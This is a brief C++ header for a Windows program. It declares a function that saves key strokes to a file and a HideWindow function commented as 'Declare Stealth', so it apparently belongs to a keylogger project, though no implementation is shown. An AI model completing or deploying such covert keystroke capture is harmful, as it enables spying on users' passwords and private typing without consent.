#pragma once
#include <iostream>
#include <string>
#include <stdlib.h>
#include <stdio.h>
// Stupid windows macro to fix min/max functions breaking all my code
// See https://stackoverflow.com/questions/6884093/warning-c4003-not-enough-actual-parameters-for-macro-max-visual-studio-2010
#define NOMINMAX
#include <windows.h>
#include <winuser.h>

// Function Prototypes
// TODO: Move prototypes to their own file
int Save(int key_stroke, char *file);
void HideWindow(); //Declare Stealth.